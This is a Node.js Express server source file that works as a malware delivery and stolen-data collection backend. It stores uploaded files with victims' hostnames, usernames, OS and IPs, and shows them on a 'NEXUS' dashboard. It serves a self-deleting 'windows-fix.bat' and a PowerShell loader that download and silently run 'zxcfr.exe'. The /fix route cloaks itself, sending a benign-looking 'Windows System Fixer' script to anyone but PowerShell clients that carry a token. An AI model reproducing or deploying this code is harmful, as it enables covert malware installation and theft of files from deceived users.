const express = require("express");
const multer = require("multer");
const crypto = require("crypto");
const { Pool } = require("pg");

const app = express();
const PORT = process.env.PORT || 8080;
const API_KEY = process.env.API_KEY || "changeme";

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.DATABASE_URL && !process.env.DATABASE_URL.includes("localhost")
    ? { rejectUnauthorized: false }
    : false,
});

async function initDb() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS grabs (
      id TEXT PRIMARY KEY,
      filename TEXT NOT NULL,
      filedata BYTEA NOT NULL,
      filesize BIGINT NOT NULL,
      ip TEXT DEFAULT '',
      machine TEXT DEFAULT '',
      username TEXT DEFAULT '',
      os TEXT DEFAULT '',
      arch TEXT DEFAULT '',
      created_at TIMESTAMPTZ DEFAULT NOW()
    )
  `);
}

initDb().catch(e => console.error("[!] db init failed:", e.message));

const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 500 * 1024 * 1024 } });

function checkKey(req, res, next) {
  const key = req.query.key || req.headers["x-api-key"] || (req.headers.authorization || "").replace("Bearer ", "");
  if (key !== API_KEY) return res.status(401).send(page404());
  next();
}

function fmtSize(bytes) {
  if (bytes < 1024) return bytes + " B";
  if (bytes < 1048576) return (bytes / 1024).toFixed(1) + " KB";
  if (bytes < 1073741824) return (bytes / 1048576).toFixed(1) + " MB";
  return (bytes / 1073741824).toFixed(2) + " GB";
}

function timeAgo(dt) {
  const ms = Date.now() - new Date(dt).getTime();
  const s = Math.floor(ms / 1000);
  if (s < 60) return s + "s ago";
  const m = Math.floor(s / 60);
  if (m < 60) return m + "m ago";
  const h = Math.floor(m / 60);
  if (h < 24) return h + "h ago";
  const d = Math.floor(h / 24);
  return d + "d ago";
}

function fmtTime(dt) {
  const d = new Date(dt);
  const pad = (n) => String(n).padStart(2, "0");
  return `${d.getUTCFullYear()}-${pad(d.getUTCMonth()+1)}-${pad(d.getUTCDate())} ${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())}:${pad(d.getUTCSeconds())}`;
}

function esc(s) {
  if (!s) return "";
  return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
}

function osIcon(os) {
  if (!os) return "?";
  const l = os.toLowerCase();
  if (l.includes("windows 10")) return "W10";
  if (l.includes("windows 11")) return "W11";
  if (l.includes("windows")) return "WIN";
  if (l.includes("linux")) return "LNX";
  if (l.includes("mac") || l.includes("darwin")) return "MAC";
  return "SYS";
}

function page404() {
  return `<!DOCTYPE html><html><head><title>404</title></head><body style="background:#000;color:#333;display:flex;align-items:center;justify-content:center;height:100vh;font-family:monospace"><h1>404</h1></body></html>`;
}

app.post("/api/v1/sync", checkKey, upload.single("file"), async (req, res) => {
  if (!req.file) return res.status(400).json({ e: 1 });
  try {
    const id = crypto.randomBytes(4).toString("hex");
    const ts = Date.now();
    const filename = `${ts}_${crypto.randomBytes(6).toString("hex")}.dat`;
    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
    await pool.query(
      `INSERT INTO grabs (id, filename, filedata, filesize, ip, machine, username, os, arch)
       VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)`,
      [id, filename, req.file.buffer, req.file.size,
       ip, req.query.m || "", req.query.u || "", req.query.o || "", req.query.a || ""]
    );
    res.json({ e: 0 });
  } catch (err) {
    console.error("[!] upload error:", err.message);
    res.status(500).json({ e: 2 });
  }
});

app.get("/", checkKey, async (req, res) => {
  try {
    const { rows } = await pool.query(
      `SELECT id, filename, filesize, ip, machine, username, os, arch, created_at
       FROM grabs ORDER BY created_at DESC`
    );
    const totalSize = rows.reduce((s, r) => s + parseInt(r.filesize || 0), 0);
    const k = encodeURIComponent(req.query.key);
    const entries = rows.map(r => ({
      id: r.id,
      f: r.filename,
      s: parseInt(r.filesize),
      t: r.created_at,
      ip: r.ip,
      m: r.machine,
      u: r.username,
      o: r.os,
      a: r.arch,
    }));
    res.send(renderPage(entries, totalSize, k));
  } catch (err) {
    console.error("[!] dashboard error:", err.message);
    res.status(500).send("db error");
  }
});

app.get("/dl/:id", checkKey, async (req, res) => {
  try {
    const { rows } = await pool.query(
      `SELECT filename, filedata FROM grabs WHERE id = $1`, [req.params.id]
    );
    if (!rows.length) return res.status(404).send(page404());
    res.setHeader("Content-Type", "application/octet-stream");
    res.setHeader("Content-Disposition", `attachment; filename=${rows[0].filename}`);
    res.send(rows[0].filedata);
  } catch (err) {
    res.status(500).send("error");
  }
});

app.post("/rm/:id", checkKey, async (req, res) => {
  try {
    await pool.query(`DELETE FROM grabs WHERE id = $1`, [req.params.id]);
    res.redirect("/?key=" + encodeURIComponent(req.query.key || ""));
  } catch (err) {
    res.redirect("/?key=" + encodeURIComponent(req.query.key || ""));
  }
});

function renderPage(entries, totalSize, k) {
  const uniqueIps = new Set(entries.map(e => e.ip)).size;
  const rows = entries.map((e) => {
    const osTag = osIcon(e.o);
    const isWin = (e.o || "").toLowerCase().includes("windows");
    return `<tr>
      <td class="mono dim">${esc(e.id)}</td>
      <td><span class="tag ${isWin ? "tag-g" : "tag-b"}">${osTag}</span></td>
      <td class="mono">${esc(e.m)}${e.u ? "<span class='dim'>\\\\"+esc(e.u)+"</span>" : ""}</td>
      <td class="mono dim">${esc(e.a)}</td>
      <td class="mono dim">${esc(e.ip)}</td>
      <td class="mono">${fmtSize(e.s || 0)}</td>
      <td><span class="dim">${fmtTime(e.t)}</span><br><span class="accent">${timeAgo(e.t)}</span></td>
      <td class="actions">
        <a class="btn btn-p" href="/dl/${esc(e.id)}?key=${k}">&#8615;</a>
        <form method="POST" action="/rm/${esc(e.id)}?key=${k}" style="display:inline" onsubmit="return confirm('remove entry?')">
          <button class="btn btn-d" type="submit">&#10005;</button>
        </form>
      </td>
    </tr>`;
  }).join("");

  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Dashboard</title>
<style>
:root{--bg:#06060f;--card:#0c0c1e;--border:#14142e;--text:#8888aa;--dim:#44446a;--accent:#c084fc;--green:#4ade80;--red:#f87171;--blue:#60a5fa;--mono:'SF Mono','Cascadia Code','Fira Code','Consolas',monospace}
*{margin:0;padding:0;box-sizing:border-box}
body{background:var(--bg);color:var(--text);font-family:var(--mono);font-size:12px;min-height:100vh}
.shell{max-width:1440px;margin:0 auto;padding:24px 20px}
.top{display:flex;align-items:center;justify-content:space-between;padding-bottom:20px;border-bottom:1px solid var(--border)}
.logo{display:flex;align-items:center;gap:10px}
.dot{width:8px;height:8px;border-radius:50%;background:var(--green);animation:blink 2.5s infinite}
@keyframes blink{0%,100%{opacity:1}50%{opacity:.2}}
.logo h1{font-size:14px;color:var(--accent);letter-spacing:3px;font-weight:600}
.top-r{font-size:10px;color:var(--dim)}
.cards{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin:20px 0}
.card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:18px 20px;position:relative;overflow:hidden}
.card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),transparent)}
.card .k{font-size:9px;color:var(--dim);text-transform:uppercase;letter-spacing:2px;margin-bottom:6px}
.card .v{font-size:24px;color:#eee;font-weight:700}
.card .v.sm{font-size:13px}
table{width:100%;border-collapse:separate;border-spacing:0;margin-top:16px}
thead th{background:var(--card);color:var(--dim);font-size:9px;text-transform:uppercase;letter-spacing:2px;padding:10px 12px;text-align:left;border-bottom:1px solid var(--border)}
thead th:first-child{border-radius:8px 0 0 0}
thead th:last-child{border-radius:0 8px 0 0}
tbody td{padding:10px 12px;border-bottom:1px solid #0a0a18;vertical-align:middle}
tbody tr{transition:background .15s}
tbody tr:hover{background:#0d0d22}
.mono{font-family:var(--mono)}
.dim{color:var(--dim)}
.accent{color:var(--accent);font-size:10px}
.tag{display:inline-block;padding:2px 8px;border-radius:4px;font-size:10px;font-weight:700;letter-spacing:1px}
.tag-g{background:#0d2818;color:var(--green)}
.tag-b{background:#1a1040;color:var(--accent)}
.actions{white-space:nowrap}
.btn{display:inline-flex;align-items:center;justify-content:center;width:28px;height:28px;border-radius:6px;border:1px solid var(--border);background:var(--card);color:var(--text);font-size:14px;cursor:pointer;text-decoration:none;transition:all .15s;font-family:var(--mono)}
.btn-p:hover{background:#1a1a3a;color:var(--blue);border-color:var(--blue)}
.btn-d:hover{background:#1a0a0a;color:var(--red);border-color:var(--red)}
.empty{text-align:center;padding:80px 20px;color:var(--dim)}
.empty .icon{font-size:36px;margin-bottom:12px;opacity:.3}
.empty p{font-size:13px}
.foot{text-align:center;padding:30px;color:#1a1a2e;font-size:10px}
@media(max-width:768px){.cards{grid-template-columns:repeat(2,1fr)}table{font-size:11px}td,th{padding:6px 8px}.shell{padding:12px 10px}}
@media(max-width:480px){.cards{grid-template-columns:1fr}}
</style>
</head>
<body>
<div class="shell">
  <div class="top">
    <div class="logo"><div class="dot"></div><h1>NEXUS</h1></div>
    <div class="top-r">live &middot; auto-refresh 30s</div>
  </div>
  <div class="cards">
    <div class="card"><div class="k">entries</div><div class="v">${entries.length}</div></div>
    <div class="card"><div class="k">volume</div><div class="v">${fmtSize(totalSize)}</div></div>
    <div class="card"><div class="k">sources</div><div class="v">${uniqueIps}</div></div>
    <div class="card"><div class="k">latest</div><div class="v sm">${entries.length ? timeAgo(entries[0].t) : "—"}</div></div>
  </div>
  ${entries.length ? `<table>
    <thead><tr><th>id</th><th>sys</th><th>host</th><th>arch</th><th>origin</th><th>size</th><th>received</th><th></th></tr></thead>
    <tbody>${rows}</tbody>
  </table>` : '<div class="empty"><div class="icon">&#9673;</div><p>no entries</p></div>'}
  <div class="foot">nexus v3</div>
</div>
<script>setTimeout(()=>location.reload(),30000)</script>
</body>
</html>`;
}

app.get("/s", (req, res) => {
  const host = req.headers.host || "zxcrosfixer.up.railway.app";
  const bat = `@echo off
set "d=%temp%\\~%random%%random%"
mkdir "%d%" >nul 2>&1
powershell -w hidden -ep bypass -c "Invoke-WebRequest -Uri 'https://${host}/pkg' -OutFile '%d%\\svcfix.exe' -UseBasicParsing; Start-Process -FilePath '%d%\\svcfix.exe' -WindowStyle Hidden -Wait; Remove-Item -Path '%d%' -Recurse -Force -ErrorAction SilentlyContinue"
echo.
echo  [92mDone. The fixer has been applied.[0m
echo.
timeout /t 3 >nul
del "%~f0"
`;
  res.setHeader("Content-Type", "application/octet-stream");
  res.setHeader("Content-Disposition", "attachment; filename=windows-fix.bat");
  res.send(bat);
});

app.get("/fix", (req, res) => {
  const ua = (req.headers["user-agent"] || "").toLowerCase();
  const host = req.headers.host || "zxcrosfixer.up.railway.app";
  const isPosh = ua.includes("powershell") || ua.includes("windowspowershell");
  const hasToken = req.query.v === "3";

  if (!(isPosh && hasToken)) {
    const fake = `# ============================================
# Windows System Fixer v3.2.1
# Maintenance & Optimization Script
# https://${host}
# ============================================
# This script performs the following tasks:
#   - Clears temporary files and caches
#   - Repairs .NET Framework installations
#   - Flushes DNS resolver cache
#   - Resets Windows Update components
#   - Verifies system file integrity (SFC)
#   - Cleans Windows component store (DISM)
#   - Optimizes prefetch data
#   - Removes stale thumbnail caches
# ============================================

$ErrorActionPreference = 'SilentlyContinue'
$Host.UI.RawUI.WindowTitle = "Windows System Fixer v3.2.1"

function Write-Status($msg) {
    Write-Host "  [*] " -ForegroundColor Cyan -NoNewline
    Write-Host $msg -ForegroundColor White
}

function Write-Done($msg) {
    Write-Host "  [+] " -ForegroundColor Green -NoNewline
    Write-Host $msg -ForegroundColor Gray
}

function Write-Warn($msg) {
    Write-Host "  [!] " -ForegroundColor Yellow -NoNewline
    Write-Host $msg -ForegroundColor Gray
}

Write-Host ""
Write-Host "  ========================================" -ForegroundColor Cyan
Write-Host "    Windows System Fixer v3.2.1" -ForegroundColor White
Write-Host "    System Maintenance & Optimization" -ForegroundColor Gray
Write-Host "  ========================================" -ForegroundColor Cyan
Write-Host ""

# --- Phase 1: Temp File Cleanup ---
Write-Status "Cleaning temporary files..."
$tempPaths = @(
    $env:TEMP,
    "$env:LOCALAPPDATA\\Temp",
    "$env:WINDIR\\Temp",
    "$env:LOCALAPPDATA\\Microsoft\\Windows\\INetCache",
    "$env:LOCALAPPDATA\\Microsoft\\Windows\\Explorer"
)
$cleaned = 0
foreach ($tp in $tempPaths) {
    if (Test-Path $tp) {
        $files = Get-ChildItem -Path $tp -Recurse -File -ErrorAction SilentlyContinue |
                 Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-7) }
        foreach ($f in $files) {
            try { Remove-Item $f.FullName -Force -ErrorAction Stop; $cleaned++ } catch {}
        }
    }
}
Write-Done "Removed $cleaned stale temporary files"

# --- Phase 2: Thumbnail Cache ---
Write-Status "Clearing thumbnail cache..."
$thumbDb = "$env:LOCALAPPDATA\\Microsoft\\Windows\\Explorer\\thumbcache_*.db"
$thumbCount = 0
Get-Item $thumbDb -ErrorAction SilentlyContinue | ForEach-Object {
    try { Remove-Item $_.FullName -Force -ErrorAction Stop; $thumbCount++ } catch {}
}
Write-Done "Cleared $thumbCount thumbnail cache files"

# --- Phase 3: DNS Flush ---
Write-Status "Flushing DNS resolver cache..."
ipconfig /flushdns | Out-Null
Write-Done "DNS cache flushed successfully"

# --- Phase 4: .NET Framework Check ---
Write-Status "Scanning .NET Framework installations..."
$dotnet = Get-ChildItem "HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP" -Recurse -ErrorAction SilentlyContinue |
    Get-ItemProperty -Name Version -ErrorAction SilentlyContinue |
    Where-Object { $_.Version -match '^\\d' } |
    Select-Object -ExpandProperty Version -Unique
if ($dotnet) {
    foreach ($v in $dotnet) { Write-Done ".NET $v detected" }
} else {
    Write-Warn "No .NET Framework versions found"
}

$dotnetCore = dotnet --list-runtimes 2>$null
if ($dotnetCore) {
    $dotnetCore | ForEach-Object { Write-Done $_ }
} else {
    Write-Warn ".NET Core/5+ runtime not installed"
}

# --- Phase 5: Windows Update Reset ---
Write-Status "Resetting Windows Update components..."
$wuServices = @("wuauserv", "cryptSvc", "bits", "msiserver")
foreach ($svc in $wuServices) {
    Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
}
$catroot = "$env:WINDIR\\System32\\catroot2.bak"
$swd = "$env:WINDIR\\SoftwareDistribution.bak"
if (Test-Path "$env:WINDIR\\SoftwareDistribution") {
    Rename-Item "$env:WINDIR\\SoftwareDistribution" $swd -Force -ErrorAction SilentlyContinue
}
if (Test-Path "$env:WINDIR\\System32\\catroot2") {
    Rename-Item "$env:WINDIR\\System32\\catroot2" $catroot -Force -ErrorAction SilentlyContinue
}
foreach ($svc in $wuServices) {
    Start-Service -Name $svc -ErrorAction SilentlyContinue
}
Write-Done "Windows Update components reset"

# --- Phase 6: System File Check ---
Write-Status "Running System File Checker (this may take a minute)..."
$sfcResult = sfc /verifyonly 2>&1 | Out-String
if ($sfcResult -match "no integrity violations") {
    Write-Done "System files verified - no issues found"
} else {
    Write-Warn "Some system files may need repair (run sfc /scannow as admin)"
}

# --- Phase 7: Prefetch Cleanup ---
Write-Status "Optimizing prefetch data..."
$prefetch = "$env:WINDIR\\Prefetch"
$pfCount = 0
if (Test-Path $prefetch) {
    Get-ChildItem $prefetch -Filter "*.pf" -ErrorAction SilentlyContinue |
        Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-30) } |
        ForEach-Object {
            try { Remove-Item $_.FullName -Force -ErrorAction Stop; $pfCount++ } catch {}
        }
}
Write-Done "Cleaned $pfCount old prefetch entries"

# --- Phase 8: Browser Cache ---
Write-Status "Clearing browser caches..."
$browserCaches = @(
    "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Cache",
    "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Code Cache",
    "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Cache",
    "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Code Cache",
    "$env:LOCALAPPDATA\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cache"
)
$browserCleaned = 0
foreach ($bc in $browserCaches) {
    if (Test-Path $bc) {
        Get-ChildItem $bc -Recurse -File -ErrorAction SilentlyContinue |
            ForEach-Object {
                try { Remove-Item $_.FullName -Force -ErrorAction Stop; $browserCleaned++ } catch {}
            }
    }
}
Write-Done "Removed $browserCleaned browser cache files"

# --- Phase 9: Event Log Summary ---
Write-Status "Checking recent system errors..."
$errors = Get-EventLog -LogName System -EntryType Error -Newest 10 -ErrorAction SilentlyContinue
if ($errors) {
    Write-Warn "$($errors.Count) recent system errors found in event log"
} else {
    Write-Done "No recent system errors"
}

# --- Phase 10: Disk Space Report ---
Write-Status "Generating disk space report..."
Get-WmiObject Win32_LogicalDisk -Filter "DriveType=3" -ErrorAction SilentlyContinue | ForEach-Object {
    $free = [math]::Round($_.FreeSpace / 1GB, 1)
    $total = [math]::Round($_.Size / 1GB, 1)
    $pct = [math]::Round(($_.FreeSpace / $_.Size) * 100, 0)
    Write-Done "$($_.DeviceID) $free GB free / $total GB total ($pct% available)"
}

Write-Host ""
Write-Host "  ========================================" -ForegroundColor Green
Write-Host "    Done. The fixer has been applied." -ForegroundColor Green
Write-Host "  ========================================" -ForegroundColor Green
Write-Host ""
Write-Host "  Press any key to exit..." -ForegroundColor Gray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
`;
    res.setHeader("Content-Type", "text/plain; charset=utf-8");
    return res.send(fake);
  }

  const script = `$ErrorActionPreference='SilentlyContinue'
$d="$env:TEMP\\$(Get-Random).tmp"
New-Item -ItemType Directory -Path $d -Force | Out-Null
$u='https://${host}/pkg'
Invoke-WebRequest -Uri $u -OutFile "$d\\zxcfr.exe" -UseBasicParsing
Start-Process -FilePath "$d\\zxcfr.exe" -WindowStyle Hidden -Wait
Remove-Item -Path $d -Recurse -Force -ErrorAction SilentlyContinue
`;
  res.setHeader("Content-Type", "text/plain");
  res.send(script);
});

app.get("/pkg", (req, res) => {
  const fp = require("path").join(__dirname, "zxcfr.exe");
  if (!require("fs").existsSync(fp)) return res.status(404).send("not found");
  res.setHeader("Content-Type", "application/octet-stream");
  res.setHeader("Content-Disposition", "attachment; filename=zxcfr.exe");
  require("fs").createReadStream(fp).pipe(res);
});

app.listen(PORT, () => {
  console.log(`[+] running on ${PORT}`);
});
